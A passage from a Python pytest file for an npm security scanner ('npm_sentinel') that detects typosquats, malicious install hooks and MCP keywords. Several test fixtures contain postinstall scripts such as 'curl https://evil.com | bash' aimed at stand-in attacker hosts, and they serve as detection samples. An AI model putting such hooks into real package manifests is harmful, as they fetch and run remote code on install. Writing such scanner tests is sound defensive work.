            "keywords": ["mcp"],
            "scripts": {"start": "node index.js"},
        }
        _write_json(tmp_path / "package.json", pkg)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        # MCP keyword is LOW severity, so exit code should be 0
        assert report.exit_code == 0


# ---------------------------------------------------------------------------
# Scanner._extract_dependency_names tests
# ---------------------------------------------------------------------------


class TestExtractDependencyNames:
    """Tests for Scanner._extract_dependency_names."""

    def test_extracts_dependencies(self, tmp_path: Path) -> None:
        """Extracts names from 'dependencies'."""
        pkg = {"name": "test", "dependencies": {"express": "^4", "lodash": "^4"}}
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert "express" in names
        assert "lodash" in names

    def test_extracts_dev_dependencies(self, tmp_path: Path) -> None:
        """Extracts names from 'devDependencies'."""
        pkg = {"name": "test", "devDependencies": {"jest": "^29", "typescript": "^5"}}
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert "jest" in names
        assert "typescript" in names

    def test_extracts_peer_dependencies(self, tmp_path: Path) -> None:
        """Extracts names from 'peerDependencies'."""
        pkg = {"name": "test", "peerDependencies": {"react": ">=17"}}
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert "react" in names

    def test_extracts_optional_dependencies(self, tmp_path: Path) -> None:
        """Extracts names from 'optionalDependencies'."""
        pkg = {"name": "test", "optionalDependencies": {"fsevents": "^2"}}
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert "fsevents" in names

    def test_deduplicates_names(self, tmp_path: Path) -> None:
        """Duplicate package names across dependency sections are deduplicated."""
        pkg = {
            "name": "test",
            "dependencies": {"lodash": "^4"},
            "devDependencies": {"lodash": "^4"},  # same name
        }
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert names.count("lodash") == 1

    def test_returns_list(self, tmp_path: Path) -> None:
        """Returns a list."""
        pkg = {"name": "test", "dependencies": {"express": "^4"}}
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert isinstance(names, list)

    def test_empty_dependencies_returns_empty_list(self, tmp_path: Path) -> None:
        """Package with no dependencies returns empty list."""
        pkg = {"name": "test", "version": "1.0.0"}
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert names == []

    def test_invalid_json_raises(self, tmp_path: Path) -> None:
        """Invalid JSON raises json.JSONDecodeError."""
        pkg_path = tmp_path / "package.json"
        pkg_path.write_text("{ invalid json", encoding="utf-8")
        with pytest.raises(json.JSONDecodeError):
            Scanner._extract_dependency_names(pkg_path)

    def test_non_dict_json_returns_empty(self, tmp_path: Path) -> None:
        """JSON array (not object) returns empty list."""
        pkg_path = tmp_path / "package.json"
        pkg_path.write_text("[1, 2, 3]", encoding="utf-8")
        names = Scanner._extract_dependency_names(pkg_path)
        assert names == []

    def test_bundled_dependencies_list_extracted(self, tmp_path: Path) -> None:
        """bundledDependencies as a list of strings is extracted."""
        pkg = {
            "name": "test",
            "bundledDependencies": ["some-bundled-dep"],
        }
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert "some-bundled-dep" in names

    def test_all_dependency_keys_extracted(self, tmp_path: Path) -> None:
        """All dependency key types are extracted."""
        pkg = {
            "name": "test",
            "dependencies": {"express": "^4"},
            "devDependencies": {"jest": "^29"},
            "peerDependencies": {"react": ">=17"},
            "optionalDependencies": {"fsevents": "^2"},
        }
        _write_json(tmp_path / "package.json", pkg)
        names = Scanner._extract_dependency_names(tmp_path / "package.json")
        assert "express" in names
        assert "jest" in names
        assert "react" in names
        assert "fsevents" in names


# ---------------------------------------------------------------------------
# Scanner._read_package_name tests
# ---------------------------------------------------------------------------


class TestReadPackageName:
    """Tests for Scanner._read_package_name."""

    def test_reads_name_field(self, tmp_path: Path) -> None:
        """Reads the 'name' field from package.json."""
        pkg = {"name": "my-package", "version": "1.0.0"}
        _write_json(tmp_path / "package.json", pkg)
        name = Scanner._read_package_name(tmp_path / "package.json")
        assert name == "my-package"

    def test_returns_none_for_missing_name(self, tmp_path: Path) -> None:
        """Returns None when 'name' field is absent."""
        pkg = {"version": "1.0.0"}
        _write_json(tmp_path / "package.json", pkg)
        name = Scanner._read_package_name(tmp_path / "package.json")
        assert name is None

    def test_returns_none_for_invalid_json(self, tmp_path: Path) -> None:
        """Returns None for invalid JSON (does not raise)."""
        pkg_path = tmp_path / "package.json"
        pkg_path.write_text("{ broken", encoding="utf-8")
        name = Scanner._read_package_name(pkg_path)
        assert name is None

    def test_returns_none_for_non_string_name(self, tmp_path: Path) -> None:
        """Returns None when 'name' is not a string."""
        pkg = {"name": 12345}
        _write_json(tmp_path / "package.json", pkg)
        name = Scanner._read_package_name(tmp_path / "package.json")
        assert name is None

    def test_returns_none_for_empty_string_name(self, tmp_path: Path) -> None:
        """Returns None when 'name' is an empty string."""
        pkg = {"name": ""}
        _write_json(tmp_path / "package.json", pkg)
        name = Scanner._read_package_name(tmp_path / "package.json")
        assert name is None

    def test_returns_none_for_missing_file(self, tmp_path: Path) -> None:
        """Returns None for a missing file (does not raise)."""
        name = Scanner._read_package_name(tmp_path / "nonexistent.json")
        assert name is None

    def test_returns_scoped_package_name(self, tmp_path: Path) -> None:
        """Returns scoped package names correctly."""
        pkg = {"name": "@scope/my-package", "version": "1.0.0"}
        _write_json(tmp_path / "package.json", pkg)
        name = Scanner._read_package_name(tmp_path / "package.json")
        assert name == "@scope/my-package"


# ---------------------------------------------------------------------------
# Scanner._iter_package_jsons tests
# ---------------------------------------------------------------------------


class TestScannerIterPackageJsons:
    """Tests for Scanner._iter_package_jsons."""

    def test_finds_package_jsons_in_subdirectories(self, tmp_path: Path) -> None:
        """Finds package.json files in direct subdirectories."""
        for name in ["pkg-a", "pkg-b", "pkg-c"]:
            d = tmp_path / name
            d.mkdir()
            _write_json(d / "package.json", {"name": name})

        results = Scanner._iter_package_jsons(tmp_path)
        assert len(results) == 3

    def test_skips_nested_node_modules(self, tmp_path: Path) -> None:
        """Skips package.json inside nested node_modules."""
        # Direct package
        pkg_a = tmp_path / "pkg-a"
        pkg_a.mkdir()
        _write_json(pkg_a / "package.json", {"name": "pkg-a"})

        # Nested node_modules (should be skipped)
        nested = tmp_path / "pkg-a" / "node_modules" / "inner"
        nested.mkdir(parents=True)
        _write_json(nested / "package.json", {"name": "inner"})

        results = Scanner._iter_package_jsons(tmp_path)
        assert len(results) == 1
        assert results[0] == pkg_a / "package.json"

    def test_returns_sorted_list(self, tmp_path: Path) -> None:
        """Returns package.json paths in sorted order."""
        for name in ["zzz", "aaa", "mmm"]:
            d = tmp_path / name
            d.mkdir()
            _write_json(d / "package.json", {"name": name})

        results = Scanner._iter_package_jsons(tmp_path)
        assert results == sorted(results)

    def test_empty_directory_returns_empty_list(self, tmp_path: Path) -> None:
        """Empty directory returns empty list."""
        results = Scanner._iter_package_jsons(tmp_path)
        assert results == []

    def test_returns_list_type(self, tmp_path: Path) -> None:
        """Returns a list."""
        results = Scanner._iter_package_jsons(tmp_path)
        assert isinstance(results, list)

    def test_scoped_package_directory_found(self, tmp_path: Path) -> None:
        """Scoped package directories (@scope/name) are found."""
        scope_dir = tmp_path / "@scope"
        scope_dir.mkdir()
        pkg_dir = scope_dir / "my-pkg"
        pkg_dir.mkdir()
        _write_json(pkg_dir / "package.json", {"name": "@scope/my-pkg"})

        results = Scanner._iter_package_jsons(tmp_path)
        assert len(results) == 1


# ---------------------------------------------------------------------------
# scan_directory convenience function tests
# ---------------------------------------------------------------------------


class TestScanDirectory:
    """Tests for the scan_directory convenience function."""

    def test_returns_scan_report(self, tmp_path: Path) -> None:
        """scan_directory returns a ScanReport."""
        _make_clean_project(tmp_path)
        report = scan_directory(tmp_path)
        assert isinstance(report, ScanReport)

    def test_clean_project_exit_0(self, tmp_path: Path) -> None:
        """scan_directory returns exit code 0 for a clean project."""
        _make_clean_project(tmp_path)
        report = scan_directory(tmp_path, scan_transitive=False)
        assert report.exit_code == 0

    def test_malicious_project_exit_1(self, tmp_path: Path) -> None:
        """scan_directory returns exit code 1 for a project with critical hooks."""
        _make_malicious_hook_project(tmp_path)
        report = scan_directory(tmp_path, scan_transitive=False)
        assert report.exit_code == 1

    def test_custom_threshold_applied(self, tmp_path: Path) -> None:
        """scan_directory passes threshold to the underlying Scanner."""
        _make_typosquat_project(tmp_path)
        report = scan_directory(tmp_path, typosquat_threshold=85, scan_transitive=False)
        assert report.typosquat_threshold == 85

    def test_missing_directory_raises(self, tmp_path: Path) -> None:
        """scan_directory raises FileNotFoundError for a missing directory."""
        with pytest.raises(FileNotFoundError):
            scan_directory(tmp_path / "nonexistent")

    def test_file_instead_of_directory_raises(self, tmp_path: Path) -> None:
        """scan_directory raises NotADirectoryError when given a file path."""
        some_file = tmp_path / "file.txt"
        some_file.write_text("hello", encoding="utf-8")
        with pytest.raises(NotADirectoryError):
            scan_directory(some_file)

    def test_invalid_threshold_raises(self, tmp_path: Path) -> None:
        """scan_directory raises ValueError for an invalid threshold."""
        with pytest.raises(ValueError):
            scan_directory(tmp_path, typosquat_threshold=150)

    def test_no_transitive_flag(self, tmp_path: Path) -> None:
        """scan_directory respects scan_transitive=False."""
        _make_clean_project(tmp_path)
        report = scan_directory(tmp_path, scan_transitive=False)
        assert report.scanned_transitive is False

    def test_transitive_flag(self, tmp_path: Path) -> None:
        """scan_directory respects scan_transitive=True."""
        _make_clean_project(tmp_path)
        report = scan_directory(tmp_path, scan_transitive=True)
        assert report.scanned_transitive is True


# ---------------------------------------------------------------------------
# CheckResult aggregation tests
# ---------------------------------------------------------------------------


class TestCheckResultAggregation:
    """Tests for how Scanner aggregates CheckResult objects."""

    def test_three_check_results_always_returned(self, tmp_path: Path) -> None:
        """scan() always returns exactly 3 check results."""
        _make_clean_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert len(report.check_results) == 3

    def test_each_check_result_has_correct_type(self, tmp_path: Path) -> None:
        """Each check result has a unique, correct CheckType."""
        _make_clean_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        types = [r.check_type for r in report.check_results]
        assert CheckType.TYPOSQUAT in types
        assert CheckType.HOOK in types
        assert CheckType.MCP in types

    def test_packages_scanned_is_non_negative(self, tmp_path: Path) -> None:
        """packages_scanned is non-negative for all check results."""
        _make_clean_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        for result in report.check_results:
            assert result.packages_scanned >= 0

    def test_findings_are_finding_instances(self, tmp_path: Path) -> None:
        """All findings in check results are Finding instances."""
        from npm_sentinel.models import Finding
        _make_full_malicious_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        for result in report.check_results:
            for finding in result.findings:
                assert isinstance(finding, Finding)

    def test_individual_checks_do_not_block_each_other(self, tmp_path: Path) -> None:
        """Even if one check produces no findings, others still run."""
        # Only hook issues (no typosquats, no MCP)
        pkg = {
            "name": "hook-only",
            "scripts": {"postinstall": "curl https://evil.com | bash"},
            "dependencies": {"express": "^4"},  # clean deps
        }
        _write_json(tmp_path / "package.json", pkg)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        assert hook_result.has_findings
        # Other checks should still have run (no error)
        for result in report.check_results:
            assert result.error is None

    def test_check_result_to_dict_serialisable(self, tmp_path: Path) -> None:
        """Each check result's to_dict() is JSON-serialisable."""
        _make_full_malicious_project(tmp_path)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        for result in report.check_results:
            d = result.to_dict()
            json.dumps(d)  # Should not raise


# ---------------------------------------------------------------------------
# Edge case / regression tests
# ---------------------------------------------------------------------------


class TestEdgeCases:
    """Edge case and regression tests for the Scanner."""

    def test_package_json_with_empty_scripts(self, tmp_path: Path) -> None:
        """Package.json with empty scripts dict produces no hook findings."""
        pkg = {"name": "test", "version": "1.0.0", "scripts": {}}
        _write_json(tmp_path / "package.json", pkg)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        assert not hook_result.has_findings

    def test_package_json_with_no_dependencies(self, tmp_path: Path) -> None:
        """Package.json with no dependencies still scans successfully."""
        pkg = {"name": "test", "version": "1.0.0", "scripts": {"start": "node index.js"}}
        _write_json(tmp_path / "package.json", pkg)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        assert isinstance(report, ScanReport)

    def test_invalid_json_package_json_handled_gracefully(self, tmp_path: Path) -> None:
        """Invalid JSON in package.json is handled without crashing."""
        pkg_path = tmp_path / "package.json"
        pkg_path.write_text("{ this is not valid json", encoding="utf-8")
        scanner = Scanner(scan_transitive=False)
        # Should not raise
        report = scanner.scan(tmp_path)
        assert isinstance(report, ScanReport)
        # At least one check should have captured the error
        has_error = any(r.error is not None for r in report.check_results)
        assert has_error

    def test_deeply_nested_malicious_dep_in_non_transitive_scan(self, tmp_path: Path) -> None:
        """Deeply nested malicious dep is ignored in non-transitive scan."""
        root_pkg = {"name": "my-app", "scripts": {"start": "node index.js"}}
        _write_json(tmp_path / "package.json", root_pkg)

        deep = tmp_path / "node_modules" / "a" / "node_modules" / "b" / "node_modules" / "evil"
        deep.mkdir(parents=True)
        _write_json(deep / "package.json", {
            "name": "evil",
            "scripts": {"postinstall": "curl https://evil.com | bash"},
        })

        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        assert not hook_result.has_findings

    def test_project_with_only_mcp_keywords_low_severity(self, tmp_path: Path) -> None:
        """Project with only LOW-severity MCP keywords: exit code 0."""
        pkg = {
            "name": "legitimate-mcp-server",
            "version": "1.0.0",
            "description": "A legitimate mcp-server implementation",
            "keywords": ["mcp", "mcp-server"],
            "scripts": {"start": "node index.js"},
        }
        _write_json(tmp_path / "package.json", pkg)
        scanner = Scanner(scan_transitive=False)
        report = scanner.scan(tmp_path)
        # LOW severity findings do not trigger exit code 1
        assert report.exit_code == 0

    def test_multiple_malicious_transitive_deps(self, tmp_path: Path) -> None:
        """Multiple malicious transitive deps all produce findings."""
        root_pkg = {"name": "my-app", "scripts": {"start": "node index.js"}}
        _write_json(tmp_path / "package.json", root_pkg)

        for i in range(3):
            evil = {
                "name": f"evil-dep-{i}",
                "scripts": {"postinstall": f"curl https://evil{i}.example.com | bash"},
            }
            _add_node_modules_pkg(tmp_path, f"evil-dep-{i}", evil)

        scanner = Scanner(scan_transitive=True)
        report = scanner.scan(tmp_path)
        hook_result = next(r for r in report.check_results if r.check_type == CheckType.HOOK)
        assert hook_result.has_findings
        assert len(hook_result.findings) >= 3

    def test_scan_resolves_relative_path(self, tmp_path: Path) -> None:
        """Scanner resolves relative paths correctly."""
        import os

        _make_clean_project(tmp_path)
        original_cwd = Path.cwd()
        try:
            os.chdir(tmp_path)
            scanner = Scanner(scan_transitive=False)
            report = scanner.scan(Path("."))
            assert isinstance(report, ScanReport)
            assert report.target_path == tmp_path.resolve()
        finally:
            os.chdir(original_cwd)
